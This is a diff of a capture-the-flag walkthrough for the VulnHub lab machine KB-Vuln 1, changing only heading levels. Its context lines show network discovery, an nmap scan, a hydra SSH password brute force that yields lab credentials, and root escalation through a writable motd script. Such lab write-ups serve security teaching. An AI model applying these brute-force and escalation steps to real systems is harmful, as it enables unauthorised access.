@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/kb-vuln-1,540/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.184
@@ -70,7 +68,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
 ```
 
-### HTML Page Source Inspection
+## HTML Page Source Inspection
 
 ```
 .
@@ -82,7 +80,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
 .
 ```
 
-### SSH Brute Force
+## SSH Brute Force
 
 ```
 $ hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.184
@@ -103,7 +101,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-10 20:15:
 
 Credentials: **sysadmin**:**password1**
 
-### SSH Access
+## SSH Access
 
 ```
 $ ssh sysadmin@192.168.1.184
@@ -122,7 +120,7 @@ See "man sudo_root" for details.
 sysadmin@kb-server:~$
 ```
 
-### Privilege Escalation
+## Privilege Escalation
 
 A file with full permission was found (/etc/update-motd.d/00-header)
 ```
@@ -149,7 +147,7 @@ To run a command as administrator (user "root"), use "sudo <command>".
 See "man sudo_root" for details.
 ```
 
-### Flag Acquiring
+## Flag Acquiring
 
 User Flag
 ```
